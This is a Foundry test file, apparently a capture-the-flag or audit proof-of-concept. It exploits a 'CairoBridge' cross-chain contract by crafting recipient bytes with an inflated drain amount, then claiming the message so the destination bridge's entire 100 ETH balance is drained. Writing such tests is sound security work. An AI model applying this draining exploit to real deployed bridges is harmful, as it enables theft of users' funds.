// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {CairoBridge} from "../src/CairoBridge.sol";

contract CairoBridgeTest is Test {
    CairoBridge public bridgeSrc;
    CairoBridge public bridgeDst;
    address public owner = makeAddr("OWNER");
    address public user = makeAddr("user");
    address public recipient = makeAddr("recipient");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy two bridge contracts
        bridgeSrc = new CairoBridge(owner);
        bridgeDst = new CairoBridge(owner);

        // Fund both with 100 ETH
        vm.deal(address(bridgeSrc), 100 ether);
        vm.deal(address(bridgeDst), 100 ether);

        // Fund user with 10 ETH for fees
        vm.deal(attacker, 10 ether);
    }

    function test_SendAndClaimMessage() public {
        // Set up values
        // Source and destination chain are the same just for testing purpose
        uint256 srcChainId = block.chainid;
        uint256 dstChainId = block.chainid;

        // write yourcode here
        uint256 executionFee = 0 ether;
        uint256 transferAmount = 1 ether;
        uint256 drainAmount = 99 ether;
        bytes memory messageData = hex"010203";
        bytes memory recipientBytes = abi.encodePacked(
            recipient,
            drainAmount,
            keccak256((messageData))
        );

        // Compose additionalData struct
        CairoBridge.AdditionalData memory additionalDataStruct = CairoBridge
            .AdditionalData({
                executionFee: executionFee,
                message: new bytes(0)
            });
        bytes memory additionalDataEncoded = abi.encode(additionalDataStruct);

        // Send message from user through bridgeSrc
        vm.prank(attacker);
        bytes32 sourceMessageHash = bridgeSrc.sendMessage{
            value: transferAmount
        }(dstChainId, additionalDataEncoded, recipientBytes);

        // Owner accepts the hash on bridgeDst
        vm.prank(owner);
        bridgeDst.acceptMessageHash(sourceMessageHash);

        uint256 bridgeDstBalanceBeforeAttack = address(bridgeDst).balance;
        assertEq(
            bridgeDstBalanceBeforeAttack,
            100 ether,
            "Incorrect path execution"
        );
        address relayer = attacker;
        vm.prank(relayer);
        bridgeDst.claimMessage(
            sourceMessageHash,
            srcChainId,
            0,
            attacker,
            abi.encodePacked(recipient),
            transferAmount,
            drainAmount,
            messageData
        );
        uint256 bridgeDstBalanceAfterAttack = address(bridgeDst).balance;
        assertEq(bridgeDstBalanceAfterAttack, 0 ether, "Attack Failed");
    }
}
